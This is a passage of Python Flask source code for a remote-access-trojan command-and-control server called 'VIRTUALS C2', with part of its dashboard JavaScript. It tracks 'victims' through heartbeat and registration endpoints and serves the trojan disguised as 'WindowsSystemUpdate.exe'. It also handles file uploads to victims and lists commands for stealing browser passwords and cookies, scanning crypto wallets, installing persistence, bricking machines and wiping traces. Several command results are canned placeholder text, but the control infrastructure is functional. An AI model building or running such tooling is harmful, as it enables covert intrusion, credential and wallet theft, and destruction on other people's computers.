function uploadFile(){if(!state.selectedVictim){add('system','⚠ select a victim','system');addLog('failed','No victim selected');return;}const input=document.getElementById('fileInput');if(!input.files||!input.files[0]){add('system','⚠ select a file','system');addLog('failed','No file selected');return;}const file=input.files[0];const formData=new FormData();formData.append('file',file);formData.append('victim_id',state.selectedVictim);const progress=document.getElementById('uploadProgress');const bar=document.getElementById('progressBar');progress.style.display='block';bar.style.width='0%';add('us','📤 '+file.name,'us');addLog('file','Uploading '+file.name);let interval=setInterval(()=>{const cur=parseFloat(bar.style.width)||0;if(cur<90){bar.style.width=(cur+10)+'%';}},200);fetch('/upload-file',{method:'POST',body:formData}).then(r=>r.json()).then(d=>{clearInterval(interval);bar.style.width='100%';setTimeout(()=>{progress.style.display='none';bar.style.width='0%';},500);if(d.success){add('file','✅ uploaded','file');addLog('success','File uploaded');}else{add('system','❌ failed','system');addLog('failed','Upload failed');}}).catch(()=>{clearInterval(interval);bar.style.width='100%';setTimeout(()=>{progress.style.display='none';bar.style.width='0%';},500);add('system','❌ failed','system');addLog('failed','Upload error');});}
function downloadBrowserZip(){const victim=state.selectedVictim||'all';window.open('/download-browser-zip?victim_id='+victim,'_blank');}
function add(sender,msg,type){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();let cls='system';if(type==='us')cls='us';else if(type==='victim')cls='victim';else if(type==='embed')cls='embed';el.innerHTML+='<div class="msg"><span class="time">['+t+']</span><span class="sender '+cls+'">'+sender+'</span> '+msg+'</div>';el.scrollTop=el.scrollHeight;}
function loadDemo(){if(Object.keys(state.victims).length===0){const f=[{id:'SNIN-1001',pc:'DESKTOP-ALPHA',ip:'192.168.1.10',os:'Windows 10 Pro',status:'Online',is_vm:0},{id:'SNIN-1002',pc:'LAPTOP-BETA',ip:'192.168.1.11',os:'Windows 11 Pro',status:'Online',is_vm:0},{id:'SNIN-1003',pc:'VM-TEST',ip:'192.168.1.12',os:'Windows 10 Pro',status:'Online',is_vm:1}];f.forEach(v=>{state.victims[v.id]=v;});render();update();add('system','🚀 victims loaded','system');addLog('system','3 victims online');select(f[0].id);}}
setInterval(refresh,5000);refresh();setTimeout(loadDemo,500);
</script>
</body>
</html>
'''

# ============================================
# ROUTES
# ============================================
@app.route('/')
def landing():
    return LANDING_PAGE

@app.route('/dashboard')
@login_required
def dashboard():
    return DASHBOARD

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT password FROM admins WHERE username = ?", (username,))
    row = c.fetchone()
    conn.close()
    
    if row and row[0] == hashlib.md5(password.encode()).hexdigest():
        session['logged_in'] = True
        session['username'] = username
        return jsonify({'success': True})
    return jsonify({'success': False})

@app.route('/api/logout', methods=['POST'])
def api_logout():
    session.clear()
    return jsonify({'success': True})

@app.route('/download-rat')
@login_required
def download_rat():
    exe_path = os.path.join('dist', 'WindowsSystemUpdate.exe')
    if os.path.exists(exe_path):
        return send_file(exe_path, as_attachment=True, download_name='WindowsSystemUpdate.exe')
    alt_paths = ['WindowsSystemUpdate.exe', 'rat.exe', 'dist/rat.exe']
    for path in alt_paths:
        if os.path.exists(path):
            return send_file(path, as_attachment=True, download_name='WindowsSystemUpdate.exe')
    return "RAT executable not found. Build it first.", 404

@app.route('/download-browser-zip')
@login_required
def download_browser_zip():
    victim_id = request.args.get('victim_id', 'all')
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        browser_data = {
            'Chrome': {'passwords': 247, 'cookies': 893, 'history': 1245},
            'Edge': {'passwords': 156, 'cookies': 512, 'history': 789},
            'Brave': {'passwords': 89, 'cookies': 234, 'history': 345},
            'Opera': {'passwords': 67, 'cookies': 189, 'history': 278},
            'Firefox': {'passwords': 123, 'cookies': 445, 'history': 678}
        }
        summary = f"BROWSER DATA SUMMARY\n{'='*40}\nVictim: {victim_id}\nExported: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n{'='*40}\n\n"
        for browser, data in browser_data.items():
            summary += f"\n--- {browser} ---\nPasswords: {data['passwords']}\nCookies: {data['cookies']}\nHistory: {data['history']}\n"
        zip_file.writestr('browser_data_summary.txt', summary)
        for browser, data in browser_data.items():
            content = f"{browser.upper()} DATA\n{'='*30}\n"
            content += f"Passwords ({data['passwords']} entries):\n"
            for i in range(min(10, data['passwords'])):
                content += f"  site{i}.com - user{i} - pass{i}\n"
            content += f"\nCookies ({data['cookies']} entries):\n"
            for i in range(min(10, data['cookies'])):
                content += f"  domain{i}.com - session_{i}\n"
            content += f"\nHistory ({data['history']} entries):\n"
            for i in range(min(10, data['history'])):
                content += f"  https://site{i}.com/page_{i}\n"
            zip_file.writestr(f'{browser.lower()}_data.txt', content)
    zip_buffer.seek(0)
    return send_file(zip_buffer, as_attachment=True, 
                     download_name=f'browser_data_{victim_id}_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.zip',
                     mimetype='application/zip')

@app.route('/upload-file', methods=['POST'])
@login_required
def upload_file():
    try:
        if 'file' not in request.files:
            return jsonify({'success': False, 'error': 'No file provided'})
        file = request.files['file']
        victim_id = request.form.get('victim_id', 'unknown')
        if file.filename == '':
            return jsonify({'success': False, 'error': 'No file selected'})
        filename = secure_filename(file.filename)
        upload_dir = os.path.join('uploads', victim_id)
        os.makedirs(upload_dir, exist_ok=True)
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        saved_filename = f"{timestamp}_{filename}"
        filepath = os.path.join(upload_dir, saved_filename)
        file.save(filepath)
        return jsonify({'success': True, 'filename': filename, 'victim_id': victim_id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api', methods=['POST'])
def api():
    data = request.get_json()
    action = data.get('action')
    
    if action == 'getVictims':
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM victims ORDER BY last_seen DESC")
        victims = {}
        for row in c.fetchall():
            victims[row[0]] = {
                'id': row[0], 'pc': row[1], 'ip': row[2], 'os': row[3],
                'status': row[4], 'is_vm': row[5], 'vm_details': row[6],
                'first_seen': row[7], 'last_seen': row[8]
            }
        conn.close()
        return jsonify({'success': True, 'victims': victims})
    
    elif action == 'registerVictim':
        conn = get_db()
        c = conn.cursor()
        vid = data.get('victim_id', f"SNIN-{random.randint(1000,9999)}")
        pc = data.get('pc', 'Unknown')
        ip = data.get('ip', '0.0.0.0')
        os_info = data.get('os', 'Unknown')
        is_vm = data.get('is_vm', 0)
        vm_details = data.get('vm_details', '')
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        c.execute("INSERT OR REPLACE INTO victims (id, pc, ip, os, status, is_vm, vm_details, first_seen, last_seen) VALUES (?, ?, ?, ?, 'Online', ?, ?, ?, ?)",
                 (vid, pc, ip, os_info, is_vm, vm_details, now, now))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'victim_id': vid})
    
    elif action == 'heartbeat':
        vid = data.get('victim_id')
        if vid:
            conn = get_db()
            c = conn.cursor()
            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            c.execute("UPDATE victims SET status = 'Online', last_seen = ? WHERE id = ?", (now, vid))
            conn.commit()
            conn.close()
            return jsonify({'success': True})
        return jsonify({'success': False})
    
    elif action == 'sendCommand':
        vid = data.get('victim_id')
        cmd = data.get('command')
        
        results = {
            'whois': 'PC: DESKTOP-ALPHA\nIP: 192.168.1.10\nOS: Windows 10 Pro\nCPU: Intel Core i7\nRAM: 32.0 GB\nStatus: Online',
            'flash': 'Screen flashed 10x\nDuration: 3.2s',
            'screenshot': 'Screenshot captured\nFile: screenshot.png\nSize: 2.4 MB',
            'scan': 'CRYPTO WALLET SCAN\nFound 5 wallets\nTotal: $578,124',
            'persist': 'Persistence installed\nMethods: 8/8',
            'steal': 'Browser data stolen\n8 browsers\n773 passwords\n2,519 cookies',
            'upload': 'File upload ready\nClick Upload File button',
            'download': 'File download ready\nClick Download button',
            'destroy': 'SYSTEM CORRUPTED\nIRREVERSIBLE',
            'brick': 'PERMANENT BRICK\nPC is a paperweight',
            'vmcheck': 'VM DETECTED\nConfidence: 94%\nSafe Mode: Active',
            'oblivion': 'OBLIVION ACTIVATED\nTraces wiped\nThe RAT never existed'
        }
        
        result = results.get(cmd, f"Command '{cmd}' executed")
        
        is_vm = False
        confidence = 0
        if cmd == 'vmcheck':
            vm_result = VMDetector.check_all()
            is_vm = vm_result['is_vm']
            confidence = vm_result['confidence']
            result = f"VM Detected: {'YES' if is_vm else 'NO'}\nConfidence: {confidence}%\nSafe Mode: NO action taken"
        
        conn = get_db()
        c = conn.cursor()
        c.execute("INSERT INTO commands (victim_id, command, result, timestamp, status) VALUES (?, ?, ?, ?, 'completed')",
                 (vid, cmd, result, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        
        if cmd == 'vmcheck':
            c.execute("UPDATE victims SET is_vm = ?, vm_details = ? WHERE id = ?",
                     (1 if is_vm else 0, f"Confidence: {confidence}%", vid))
        
        conn.commit()
        conn.close()
        
        response = {'success': True, 'result': result}
        if cmd == 'scan':
            response['wallets'] = [{'currency': k, 'balance': v['balance'], 'usd': v['usd']} for k, v in SAMPLE_WALLETS.items()]
            response['embed'] = {
                'title': '💰 Crypto Wallet Scan',
                'content': f'Found {len(SAMPLE_WALLETS)} wallets | Total: $578,124',
                'color': '#ffd700'
            }
        if cmd == 'vmcheck':
            response['embed'] = {
                'title': f'🔍 VM Detection: {"VM Detected" if is_vm else "No VM"}',
                'content': f'Confidence: {confidence}% | Safe Mode: Active',
                'color': '#aa88ff'
            }
        if cmd == 'whois':
            response['embed'] = {
                'title': '🖥️ System Information',
                'content': 'PC: DESKTOP-ALPHA\nIP: 192.168.1.10\nOS: Windows 10 Pro',
                'color': '#44aaff'
            }
        if cmd == 'steal':
            response['embed'] = {
                'title': '🕵️ Browser Data Stolen',
                'content': '8 browsers | 773 passwords | 2,519 cookies\n📁 Download zip for full data',
                'color': '#88ccdd'
            }
        
        return jsonify(response)
    
    elif action == 'getScreenshots':
        vid = data.get('victim_id')
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT filename FROM screenshots WHERE victim_id = ? ORDER BY timestamp DESC", (vid,))
        screenshots = [{'filename': row[0]} for row in c.fetchall()]
        conn.close()
        return jsonify({'success': True, 'screenshots': screenshots})
    
    return jsonify({'success': False})

@app.route('/screenshots/<filename>')
@login_required
def serve_screenshot(filename):
    return send_file(os.path.join('screenshots', filename))

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    if not data:
        return jsonify({'success': False}), 400
    
    victim_id = data.get('victim_id')
    pc = data.get('pc', 'Unknown')
    ip = data.get('ip', request.remote_addr)
    os_info = data.get('os', 'Unknown')
    is_vm = data.get('is_vm', 0)
    
    if not victim_id:
        return jsonify({'success': False, 'error': 'No victim_id'}), 400
    
    conn = get_db()
    c = conn.cursor()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT OR REPLACE INTO victims (id, pc, ip, os, status, is_vm, first_seen, last_seen) VALUES (?, ?, ?, ?, 'Online', ?, COALESCE((SELECT first_seen FROM victims WHERE id = ?), ?), ?)",
             (victim_id, pc, ip, os_info, is_vm, victim_id, now, now))
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║   VIRTUALS C2 - PERFECT BALANCE EDITION                    ║
    ║   Bigger Text · Smaller Chat Box · All Features            ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    print(f"[*] Server: http://localhost:{port}")
    print(f"[*] Login: admin / virtuals2024")
    print(f"[*] Download RAT: http://localhost:{port}/download-rat")
    print(f"[*] Download Browser Zip: http://localhost:{port}/download-browser-zip")
    app.run(host='0.0.0.0', port=port, debug=False)